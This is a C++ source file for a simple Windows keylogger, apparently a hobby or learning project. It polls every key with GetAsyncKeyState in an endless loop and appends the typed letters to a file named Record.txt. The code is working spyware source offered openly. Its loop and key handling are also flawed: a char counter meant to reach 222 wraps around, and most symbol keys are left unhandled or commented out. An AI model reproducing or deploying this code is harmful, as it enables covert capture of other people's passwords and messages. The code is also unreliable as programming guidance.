//============================================================================
// Name        : keylogger.cpp
// Author      : Sachin Lohith
// Version     : 1.0
//============================================================================

#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

void log() {
	char key;
	while (1) {
		for (key = 8; key <= 222; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				ofstream write("Record.txt", ios::app);

				if( (key>64) && (key < 91) && !(GetAsyncKeyState(0x10))) {
					key += 32;
					write << key;
					write.close();
					break;
				} else if ( (key>64) && (key<91) ){
					write << key;
					write.close();
					break;
				} else {
					switch(key) {
					case 49: {
						if(GetAsyncKeyState(0x10))
							write << "!";
					}
					}
				}
//				switch(key) {
//				case 8: write << "<backspace>"; break;
//				case 9: write << "<tab>"; break;
//				case 27: write << "<esc>"; break;
//				case 127: write << "<del>"; break;
//				case 32: write << " "; break;
//				case 13: write << "<enter>\n"; break;
//				default: write << key;
//				}
			}
		}
	}
}

int main() {
	log();
	return 0;
}
